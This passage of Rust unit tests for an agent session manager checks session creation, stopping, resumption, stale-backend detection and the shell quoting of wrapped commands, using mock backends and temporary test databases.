        };
        let session = mgr.create_session(req).await.unwrap();
        assert!(!session.workdir.is_empty());
    }

    #[tokio::test]
    async fn test_create_session_calls_setup_logging_when_capture_enabled() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let mgr = mgr.with_capture_session_output(true);
        let _session = mgr.create_session(make_req("test")).await.unwrap();

        let calls = backend.calls.lock().unwrap();
        assert!(
            calls.iter().any(|c| c.starts_with("setup_logging:")),
            "Expected setup_logging call, got: {calls:?}"
        );
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_explicit_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "custom-name".into(),
            ..make_req("test")
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.name, "custom-name");
    }

    #[tokio::test]
    async fn test_create_session_workdir_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            workdir: Some("/nonexistent/path/that/does/not/exist".into()),
            ..make_req("test")
        };
        let result = mgr.create_session(req).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("does not exist"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_workdir_is_file() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        let path = tmp.path().to_str().unwrap().to_owned();
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            workdir: Some(path),
            ..make_req("test")
        };
        let result = mgr.create_session(req).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("not a directory"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_backend_failure() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_create_error()).await;
        let result = mgr.create_session(make_req("test")).await;
        assert!(result.is_err());

        // Session should be marked Dead in store
        let sessions = mgr.list_sessions().await.unwrap();
        assert_eq!(sessions.len(), 1);
        assert_eq!(sessions[0].status, SessionStatus::Done);
    }

    #[tokio::test]
    async fn test_create_session_duplicate_name_rejected() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("dupe")).await.unwrap();
        let err = mgr.create_session(make_req("dupe")).await.unwrap_err();
        assert!(
            err.to_string().contains("already active"),
            "expected duplicate name error, got: {err}"
        );
    }

    #[tokio::test]
    async fn test_create_session_reuse_name_after_stop() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("reuse")).await.unwrap();
        mgr.stop_session("reuse", false).await.unwrap();
        // Should succeed — the old session is stopped
        mgr.create_session(make_req("reuse")).await.unwrap();
    }

    #[tokio::test]
    async fn test_get_session_alive() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Working);
    }

    #[tokio::test]
    async fn test_get_session_dead_lazy_update() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_get_session_idle_with_dead_backend_transitions_to_lost() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // Manually set session to Idle (simulates watchdog marking it idle before reboot)
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Waiting, None)
            .await
            .unwrap();

        // When fetched, check_and_mark_stale should detect dead backend and mark Lost
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_get_session_dead_backend_emits_event_with_real_previous_status() {
        // Regression test: `get_session` used to hard-code `previous_status =
        // Working` on every dead-backend transition regardless of what the
        // session's actual prior status was — wrong here, where it was `Waiting`.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("stale-waiting")).await.unwrap();
        // Drain the create event.
        let _ = event_rx.recv().await;

        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Waiting, None)
            .await
            .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);

        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.status, "lost");
        assert_eq!(
            se.previous_status.as_deref(),
            Some("waiting"),
            "must report the session's real previous status, not a hard-coded one"
        );
    }

    #[tokio::test]
    async fn test_list_sessions_dead_backend_emits_event() {
        // Regression test: `mark_stale_in_sessions` (the lazy sweep behind
        // `list_sessions`/`list_sessions_filtered`) used to resolve a dead backend
        // silently — no `lifecycle` event/webhook fired at all for a session that
        // was only ever discovered via a `pulpo ls`/`GET /sessions` call rather
        // than a single-session GET.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("stale-list")).await.unwrap();
        let _ = event_rx.recv().await; // drain the create event

        let sessions = mgr.list_sessions().await.unwrap();
        let listed = sessions
            .iter()
            .find(|s| s.id == session.id)
            .expect("session should still be listed");
        assert_eq!(listed.status, SessionStatus::Lost);

        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.session_name, "stale-list");
        assert_eq!(se.status, "lost");
        assert_eq!(se.previous_status.as_deref(), Some("working"));
    }

    #[tokio::test]
    async fn test_get_session_idle_with_alive_backend_stays_idle() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(true)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Waiting, None)
            .await
            .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Waiting);
    }

    // -- `Done` is a true terminal status (ADR 0009) --
    //
    // Before ADR 0009's five-state model, `check_and_mark_stale` also swept `Ready`
    // sessions (agent exited, fallback shell lingering) so a `Ready` session whose
    // tmux backend later died could still be reclassified. `wrap_command` no longer
    // keeps a fallback shell alive after the agent exits, so that persistent
    // "done but still alive" backend state doesn't exist anymore — `Done` is reached
    // only once a backend is already confirmed dead (or a harness's `SessionEnded`
    // event finds the exit marker already on disk), and nothing ever re-checks a
    // `Done` session's backend liveness again. These tests lock in that a `Done`
    // session is never revisited, unlike a genuinely live `Working`/`Waiting` one.

    #[tokio::test]
    async fn test_get_session_done_status_is_never_rechecked() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("done-alive")).await.unwrap();
        let id = session.id.to_string();

        mgr.store()
            .update_session_status(&id, SessionStatus::Done, Some("exited"))
            .await
            .unwrap();

        // The mock backend reports dead, but `get_session` must not re-run the
        // dead-backend check against an already-`Done` session.
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert_eq!(fetched.status_reason.as_deref(), Some("exited"));
    }

    #[tokio::test]
    async fn test_list_sessions_done_status_is_never_rechecked() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("done-list")).await.unwrap();
        let id = session.id.to_string();

        mgr.store()
            .update_session_status(&id, SessionStatus::Done, Some("exited"))
            .await
            .unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        let listed = sessions.iter().find(|s| s.id.to_string() == id).unwrap();
        assert_eq!(listed.status, SessionStatus::Done);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_skips_done_sessions() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("done-resume-skip"))
            .await
            .unwrap();
        let id = session.id.to_string();
        mgr.store()
            .update_session_status(&id, SessionStatus::Done, Some("exited"))
            .await
            .unwrap();

        *backend.alive.lock().unwrap() = false;
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0, "a done session must never be auto-resumed");

        let fetched = mgr.store().get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);

        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    #[tokio::test]
    async fn test_list_sessions_idle_with_dead_backend_transitions_to_lost() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // Manually set session to Idle
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Waiting, None)
            .await
            .unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        assert_eq!(sessions[0].status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_get_session_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.get_session("nonexistent").await.unwrap();
        assert!(result.is_none());
    }

    #[tokio::test]
    async fn test_list_sessions_with_mixed_status() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let s1 = mgr.create_session(make_req("first")).await.unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        assert_eq!(sessions.len(), 1);
        // is_alive returns false, so Running → Stale
        assert_eq!(sessions[0].id, s1.id);
        assert_eq!(sessions[0].status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_stop_session() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        mgr.stop_session(&session.id.to_string(), false)
            .await
            .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
    }

    #[tokio::test]
    async fn test_stop_session_with_purge() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();

        mgr.stop_session(&id, true).await.unwrap();

        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_session_reports_lost_when_backend_dies_concurrently_mid_stop() {
        // `stop_session` kills the backend BEFORE its own CAS to `done/stopped`
        // — a real gap in which a concurrent resolver (the watchdog's own eager
        // dead-backend sweep) can notice the just-killed backend and resolve
        // the session to `Lost` first. This call must then report the
        // session's REAL outcome (`lost`, since it evidently crashed rather
        // than being cleanly stopped) instead of claiming credit for a
        // `stopped` transition it didn't actually make (API 200 "already
        // done"/`lost`, not 204 "stopped").
        //
        // Simulated deterministically (no timing/race dependency): the
        // backend's own `kill_session` performs the competing transition
        // itself, landing exactly in the gap between the kill and
        // `stop_session`'s own CAS — see `MockBackend::with_on_kill`.
        let tmpdir = tempfile::tempdir().unwrap();
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();

        let id_holder: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
        let hook_store = store.clone();
        let hook_id_holder = id_holder.clone();
        let backend = MockBackend::new().with_on_kill(Box::new(move || {
            if let Some(id) = hook_id_holder.lock().unwrap().clone() {
                let _ = futures::executor::block_on(hook_store.transition_to_terminal_if_live(
                    &id,
                    SessionStatus::Lost,
                    None,
                    None,
                ));
            }
        }));

        let mgr = SessionManager::new(Arc::new(backend), store, None);
        let session = mgr.create_session(make_req("racy-stop")).await.unwrap();
        let id = session.id.to_string();
        *id_holder.lock().unwrap() = Some(id.clone());

        let reported_terminal = mgr.stop_session(&id, false).await.unwrap();

        assert!(
            reported_terminal,
            "stop_session must not report success (204/\"stopped\") for a transition it lost"
        );
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(
            fetched.status,
            SessionStatus::Lost,
            "the real outcome must be reported/preserved, never silently overwritten to `stopped`"
        );
    }

    #[tokio::test]
    async fn test_mark_session_stopped_returns_false_when_no_longer_live() {
        // Direct unit test of `mark_session_stopped`'s own CAS semantics: when
        // the row is no longer in a live status by the time this call's UPDATE
        // runs (a concurrent resolver got there first), it must report `false`
        // and leave the row exactly as that concurrent winner set it.
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("mark-stopped-race"))
            .await
            .unwrap();
        let id = session.id.to_string();
        mgr.store()
            .update_session_status(&id, SessionStatus::Lost, None)
            .await
            .unwrap();

        let mut stale_in_memory = session; // still says `Working`
        let transitioned = mgr.mark_session_stopped(&mut stale_in_memory).await.unwrap();

        assert!(!transitioned);
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_stop_session_on_already_done_session_preserves_status_reason() {
        // Regression test: `pulpo stop` on a session that already finished (via
        // budget/idle/exit, not an explicit stop) used to unconditionally call
        // `mark_session_stopped`, overwriting the real reason (`budget_exceeded`
        // here) with the generic `stopped` — destroying exactly the information an
        // operator would want to see. It must now be a no-op on status.
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("already-done")).await.unwrap();
        let id = session.id.to_string();
        mgr.store()
            .update_session_status(&id, SessionStatus::Done, Some("budget_exceeded"))
            .await
            .unwrap();

        let already_terminal = mgr.stop_session(&id, false).await.unwrap();

        assert!(already_terminal, "stop_session should report a no-op");
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert_eq!(fetched.status_reason.as_deref(), Some("budget_exceeded"));
        // The backend was never even asked to kill anything for an already-dead session.
        assert!(
            !backend
                .calls
                .lock()
                .unwrap()
                .iter()
                .any(|c| c.starts_with("kill:")),
            "stop_session must skip the backend-kill attempt for an already-terminal session"
        );
    }

    #[tokio::test]
    async fn test_stop_session_on_already_lost_session_reports_no_op_and_still_purges() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("already-lost")).await.unwrap();
        let id = session.id.to_string();
        mgr.store()
            .update_session_status(&id, SessionStatus::Lost, None)
            .await
            .unwrap();

        let already_terminal = mgr.stop_session(&id, true).await.unwrap();

        assert!(already_terminal);
        // `--purge` is independent cleanup and still runs even though the status
        // transition itself was skipped.
        assert!(mgr.get_session(&id).await.unwrap().is_none());
    }

    #[tokio::test]
    async fn test_stop_session_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.stop_session("nonexistent", false).await;
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("session not found")
        );
    }

    #[tokio::test]
    async fn test_stop_session_backend_error_recovers_by_name() {
        // Kill by stale $N ID fails, but retry by session name succeeds
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_kill_error()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let result = mgr.stop_session(&session.id.to_string(), false).await;
        assert!(result.is_ok(), "stop should succeed via name fallback");
    }

    #[tokio::test]
    async fn test_capture_output() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let output = mgr.capture_output("some-id", "my-session", 100);
        assert_eq!(output, "test output");
    }

    #[tokio::test]
    async fn test_capture_output_falls_back_to_log() {
        let backend = MockBackend::new();
        *backend.captured_output.lock().unwrap() = String::new();
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let data_dir = tmpdir.path().to_str().unwrap();
        let store = Store::new(data_dir).await.unwrap();
        store.migrate().await.unwrap();

        // Create a log file
        let log_dir = format!("{data_dir}/logs");
        std::fs::create_dir_all(&log_dir).unwrap();
        std::fs::write(
            format!("{log_dir}/test-id.log"),
            "line 1\nline 2\nline 3\nline 4\nline 5\n",
        )
        .unwrap();

        // Verify all FailCapture backend methods for coverage
        let fc = FailCapture;
        assert!(fc.create_session("n", "d", "c").is_ok());
        assert!(fc.kill_session("n").is_ok());
        assert!(fc.is_alive("n").unwrap());
        assert!(fc.capture_output("n", 10).is_err());
        assert!(fc.send_input("n", "t").is_ok());
        assert!(fc.setup_logging("n", "p").is_ok());

        let mgr = SessionManager::new(Arc::new(FailCapture), store, None);
        let output = mgr.capture_output("test-id", "whatever", 3);
        assert_eq!(output, "line 3\nline 4\nline 5");
    }

    #[tokio::test]
    async fn test_read_log_tail_missing_file() {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(
            Arc::new(MockBackend::new()) as Arc<dyn Backend>,
            store,
            None,
        );
        // read_log_tail for nonexistent file returns empty string
        let output = mgr.read_log_tail("nonexistent", 10);
        assert!(output.is_empty());
    }

    #[tokio::test]
    async fn test_send_input() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        mgr.send_input("my-session", "hello").unwrap();

        let calls = backend.calls.lock().unwrap();
        assert!(
            calls
                .iter()
                .any(|c| c.contains("send_input:my-session:hello"))
        );
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_store_insert_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        // Drop the table to make insert_session fail
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.create_session(make_req("test")).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_list_sessions_store_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.list_sessions().await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_get_session_store_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.get_session("test").await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_stop_session_store_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.stop_session("test", false).await;
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_workdir_ok() {
        assert!(validate_workdir("/tmp").is_ok());
    }

    #[test]
    fn test_validate_workdir_missing() {
        let err = validate_workdir("/nonexistent/path")
            .unwrap_err()
            .to_string();
        assert!(err.contains("does not exist"), "got: {err}");
    }

    #[test]
    fn test_validate_workdir_is_file() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        let path = tmp.path().to_str().unwrap();
        let err = validate_workdir(path).unwrap_err().to_string();
        assert!(err.contains("not a directory"), "got: {err}");
    }

    #[tokio::test]
    async fn test_resume_stale_session() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // get_session marks it Stale since is_alive returns false
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);

        // Now resume it — backend session is still alive, so it should skip create_session
        *backend.alive.lock().unwrap() = true;
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        // Verify create_session was NOT called (backend session already exists)
        let calls: Vec<_> = backend.calls.lock().unwrap().clone();
        assert!(
            !calls.iter().any(|c| c.starts_with("create:")),
            "should not recreate backend session when alive; calls: {calls:?}"
        );
    }

    #[tokio::test]
    async fn test_resume_stale_session_recreates_when_backend_dead() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // get_session marks it Stale since is_alive returns false
        let _ = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();

        // Resume while backend session is dead — should recreate
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        // Verify create_session WAS called
        let calls: Vec<_> = backend.calls.lock().unwrap().clone();
        assert!(
            calls.iter().any(|c| c.starts_with("create:")),
            "should recreate backend session when dead; calls: {calls:?}"
        );
    }

    #[tokio::test]
    async fn test_resume_non_stale_session_fails() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // Session is Active, not Lost/Ready
        let result = mgr.resume_session(&session.id.to_string()).await;
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("cannot be resumed")
        );
    }

    #[tokio::test]
    async fn test_resume_nonexistent_session() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.resume_session("nonexistent").await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not found"));
    }

    #[tokio::test]
    async fn test_resume_name_collision_rejected() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        // Create "dup", then mark it lost so it's resumable
        let old = mgr.create_session(make_req("dup")).await.unwrap();
        let old_id = old.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&old_id)
            .execute(&pool)
            .await
            .unwrap();
        // Create a new active "dup"
        mgr.create_session(make_req("dup")).await.unwrap();
        // Resuming the old lost one should fail — name collision
        let err = mgr.resume_session(&old_id).await.unwrap_err();
        assert!(err.to_string().contains("already active"), "{err}");
    }

    #[tokio::test]
    async fn test_resume_backend_failure() {
        let backend = MockBackend::new().with_alive(false);
        let (mgr, backend_ref, _pool) = test_manager(backend).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let id = session.id.to_string();

        // Mark stale
        let _ = mgr.get_session(&id).await.unwrap();

        // Make create_session fail for resume
        *backend_ref.create_result.lock().unwrap() = Err(anyhow!("backend not found"));
        let result = mgr.resume_session(&id).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_resume_done_session_does_not_self_collide() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("done-test")).await.unwrap();
        let id = session.id.to_string();

        // Mark session as Done (simulates a session whose agent finished)
        mgr.store()
            .update_session_status(&id, SessionStatus::Done, None)
            .await
            .unwrap();

        // Resuming a Done session should succeed — it must not collide with itself
        let resumed = mgr.resume_session(&id).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);
    }

    #[test]
    fn test_wrap_command_basic() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "echo hello",
            &id,
            "test-session",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(cmd.contains("-l -c"));
        assert!(cmd.contains("echo hello"));
        // ADR 0009: no more fallback shell / "Agent exited" message — the wrapper
        // just writes both markers and lets the shell (and tmux with it) exit.
        assert!(!cmd.contains("[pulpo] Agent exited"));
        assert!(!cmd.contains("Run: pulpo resume"));
        assert!(!cmd.contains("exec "));
        // Exit-code marker: `$?` captured immediately, then written to `{id}.code`,
        // followed directly by the `.clean` marker — nothing runs in between.
        assert!(cmd.contains("ec=$?"));
        assert!(cmd.contains(&format!("{id}.code")));
        assert!(cmd.contains(&format!("{id}.clean")));
        assert!(cmd.contains(&format!("PULPO_SESSION_ID={id}")));
        assert!(cmd.contains("PULPO_SESSION_NAME=test-session"));
        assert!(cmd.contains(&format!("PULPO_URL=http://127.0.0.1:{DEFAULT_DAEMON_PORT}")));
    }

    #[test]
    fn test_wrap_command_exports_configured_daemon_port() {
        // `PULPO_URL` must reflect whatever port was threaded in, not just the
        // default — this is how `pulpo hook` finds a daemon on a non-default
        // `[node].port` (see `pulpo-cli/src/hook.rs`).
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo hello", &id, "test-session", None, "/tmp", 9999);
        assert!(cmd.contains("PULPO_URL=http://127.0.0.1:9999"));
        assert!(!cmd.contains(&format!("PULPO_URL=http://127.0.0.1:{DEFAULT_DAEMON_PORT}")));
    }

    #[test]
    fn test_wrap_command_single_quotes() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "claude -p 'Fix the bug'",
            &id,
            "my-task",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(cmd.contains("-l -c"));
        // Single quotes should be properly escaped
        assert!(cmd.contains("claude -p"));
        assert!(cmd.contains("Fix the bug"));
        assert!(cmd.contains("PULPO_SESSION_ID="));
        assert!(cmd.contains("PULPO_SESSION_NAME=my-task"));
        assert!(!cmd.contains("(session: my-task)"));
        assert!(!cmd.contains("Run: pulpo resume my-task"));
    }

    #[test]
    fn test_wrap_command_quoting_is_valid_shell() {
        // Verify the wrapped command has balanced single quotes so it doesn't
        // cause "unmatched '" errors when tmux passes it to the shell.
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "claude",
            &id,
            "test-session",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );

        // Count single quotes outside of escaped sequences (\')
        // The '\'' pattern (end-quote, escaped-quote, start-quote) is valid.
        // After removing all '\'' patterns, remaining quotes must be balanced.
        let simplified = cmd.replace("'\\''", "X");
        let quote_count = simplified.chars().filter(|&c| c == '\'').count();
        assert_eq!(
            quote_count % 2,
            0,
            "unbalanced single quotes in wrapped command: {cmd}"
        );
    }

    #[test]
    fn test_wrap_command_executes_without_parse_error() {
        // Run the entire wrapped command through `sh -n` (parse-only) to catch
        // quoting bugs. The wrapped command is a complete shell invocation like
        // `/bin/zsh -l -c '...'`, so we parse it as a whole.
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "true",
            &id,
            "test-session",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );

        let output = std::process::Command::new("sh")
            .args(["-n", "-c", &cmd])
            .output()
            .expect("failed to spawn shell");

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            output.status.success(),
            "wrapped command has shell syntax errors:\n  command: {cmd}\n  stderr: {stderr}"
        );
    }

    #[test]
    fn test_wrap_command_with_quotes_executes_without_parse_error() {
        // Same test but with a command containing single quotes (common with claude -p).
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "echo 'hello world'",
            &id,
            "quoted-session",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );

        let output = std::process::Command::new("sh")
            .args(["-n", "-c", &cmd])
            .output()
            .expect("failed to spawn shell");

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            output.status.success(),
            "wrapped command with quotes has shell syntax errors:\n  command: {cmd}\n  stderr: {stderr}"
        );
    }

    #[test]
    fn test_is_shell_command() {
        assert!(is_shell_command("bash"));
        assert!(is_shell_command("zsh"));
        assert!(is_shell_command("sh"));
        assert!(is_shell_command("fish"));
        assert!(is_shell_command("nu"));
        assert!(is_shell_command("/bin/bash"));
        assert!(is_shell_command("/usr/bin/zsh"));
        assert!(!is_shell_command("claude"));
        assert!(!is_shell_command("claude -p 'fix'"));
        assert!(!is_shell_command("npm run lint"));
        assert!(!is_shell_command("bash -c 'echo hello'"));
    }

    #[test]
    fn test_wrap_command_shell_no_exit_marker() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("bash", &id, "my-shell", None, "/tmp", DEFAULT_DAEMON_PORT);
        // Bare-shell spawns are NOT exec'd — the wrapper must regain control to
        // write the `.clean` marker after the interactive shell exits.
        assert!(cmd.contains("bash;"));
        assert!(!cmd.contains("exec bash"));
        assert!(cmd.contains(&format!("PULPO_SESSION_ID={id}")));
        assert!(cmd.contains("PULPO_SESSION_NAME=my-shell"));
        assert!(cmd.contains(&format!("PULPO_URL=http://127.0.0.1:{DEFAULT_DAEMON_PORT}")));
        // Shell sessions should NOT have the agent-exit hint, nor an exit-code marker
        // (only `.clean` is written on this path).
        assert!(!cmd.contains("[pulpo] Agent exited"));
        assert!(!cmd.contains("Run: pulpo resume"));
        assert!(!cmd.contains(&format!("{id}.code")));
        assert!(cmd.contains(&format!("{id}.clean")));
    }

    #[test]
    fn test_wrap_command_shell_with_path() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "/usr/bin/zsh",
            &id,
            "zsh-session",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(cmd.contains("/usr/bin/zsh;"));
        assert!(!cmd.contains("exec /usr/bin/zsh"));
        assert!(!cmd.contains("[pulpo] Agent exited"));
    }

    #[test]
    fn test_wrap_command_data_dir_with_spaces_is_escaped_and_parses() {
        // data_dir may contain spaces (e.g. "/Users/dario/My Documents/.pulpo") — the
        // exit-marker directory must be quoted defensively, just like session names.
        let id = uuid::Uuid::new_v4();
        let data_dir = "/tmp/pulpo test dir";
        let cmd = wrap_command("echo hi", &id, "test", None, data_dir, DEFAULT_DAEMON_PORT);
        assert!(cmd.contains(&format!("{id}.code")));
        assert!(cmd.contains(&format!("{id}.clean")));
        assert!(cmd.contains("pulpo test dir"));

        // The whole wrapped command must still parse as valid shell despite the space.
        let output = std::process::Command::new("sh")
            .args(["-n", "-c", &cmd])
            .output()
            .expect("failed to spawn shell");
        assert!(
            output.status.success(),
            "wrapped command with spaced data_dir has shell syntax errors:\n  command: {cmd}\n  stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    #[test]
    fn test_wrap_command_term_program() {
